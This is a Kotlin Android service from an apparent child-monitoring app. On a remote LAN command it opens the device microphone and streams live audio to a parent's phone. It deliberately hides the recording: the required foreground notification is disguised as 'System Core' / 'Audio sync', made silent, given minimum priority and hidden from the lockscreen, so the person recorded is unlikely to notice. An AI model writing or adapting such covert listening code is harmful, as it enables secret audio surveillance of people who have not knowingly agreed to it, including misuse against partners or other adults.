package com.vyra.kids.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.vyra.kids.core.AppConstants
import com.vyra.kids.core.AudioChunkBuffer
import kotlinx.coroutines.*

/**
 * LiveAudioStreamService — Real-time mic capture for live listening.
 *
 * Captures mic as PCM_16BIT 16kHz mono in a tight loop and pushes chunks into
 * AudioChunkBuffer. LocalLanSyncServer reads from that buffer and streams a
 * proper WAV-header + raw PCM response to the parent app's audio player.
 *
 * Parent taps "Live Listen" → parent sends START_LIVE_AUDIO command over LAN →
 * child starts this service → mic opens → LAN server streams WAV to parent →
 * audioplayers on parent plays the URL → instant live audio.
 */
class LiveAudioStreamService : Service() {

    private var audioRecord: AudioRecord? = null
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var isCapturing = false

    companion object {
        const val ACTION_START_LIVE_AUDIO = "com.vyra.kids.START_LIVE_AUDIO"
        const val ACTION_STOP_LIVE_AUDIO  = "com.vyra.kids.STOP_LIVE_AUDIO"

        const val SAMPLE_RATE  = 16000                        // 16 kHz — voice clarity
        const val CHANNELS     = AudioFormat.CHANNEL_IN_MONO
        const val AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT
        val BUFFER_SIZE: Int   = AudioRecord
            .getMinBufferSize(SAMPLE_RATE, CHANNELS, AUDIO_FORMAT)
            .coerceAtLeast(3200)                              // minimum 200ms per chunk
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START_LIVE_AUDIO -> {
                startForegroundCompat()
                startCapturing()
            }
            ACTION_STOP_LIVE_AUDIO -> {
                stopCapturing()
                stopSelf()
            }
        }
        return START_NOT_STICKY
    }

    private fun startForegroundCompat() {
        val channelId = "vyra_live_audio"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(channelId, "System Core", NotificationManager.IMPORTANCE_MIN).apply {
                setShowBadge(false); setSound(null, null)
                enableLights(false); enableVibration(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(ch)
        }
        val notif = NotificationCompat.Builder(this, channelId)
            .setContentTitle("System Core").setContentText("Audio sync")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true).setShowWhen(false).setOngoing(true).build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                AppConstants.SERVICE_NOTIFICATION_ID + 7, notif,
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            )
        } else {
            startForeground(AppConstants.SERVICE_NOTIFICATION_ID + 7, notif)
        }
    }

    private fun startCapturing() {
        if (isCapturing) return
        isCapturing = true
        AudioChunkBuffer.isActive = true
        AudioChunkBuffer.clear()

        scope.launch {
            try {
                audioRecord = AudioRecord(
                    MediaRecorder.AudioSource.MIC,
                    SAMPLE_RATE, CHANNELS, AUDIO_FORMAT,
                    BUFFER_SIZE * 4           // 4× buffer to avoid underruns
                )

                if (audioRecord?.state != AudioRecord.STATE_INITIALIZED) {
                    Log.e(AppConstants.TAG, "LiveAudio: AudioRecord failed to initialize")
                    stopCapturing(); return@launch
                }

                audioRecord!!.startRecording()
                Log.i(AppConstants.TAG, "LiveAudioStreamService STARTED — ${SAMPLE_RATE}Hz PCM_16BIT MONO")

                val buf = ByteArray(BUFFER_SIZE)
                while (isCapturing) {
                    val read = audioRecord?.read(buf, 0, buf.size) ?: -1
                    if (read > 0) {
                        AudioChunkBuffer.offer(buf.copyOf(read))
                    }
                }
            } catch (e: Exception) {
                Log.e(AppConstants.TAG, "LiveAudio capture error", e)
            } finally {
                try {
                    audioRecord?.stop()
                    audioRecord?.release()
                    audioRecord = null
                } catch (_: Exception) {}
                AudioChunkBuffer.isActive = false
                Log.i(AppConstants.TAG, "LiveAudioStreamService STOPPED")
            }
        }
    }

    private fun stopCapturing() {
        isCapturing = false
        AudioChunkBuffer.isActive = false
    }

    override fun onDestroy() {
        stopCapturing()
        scope.cancel()
        super.onDestroy()
    }
}
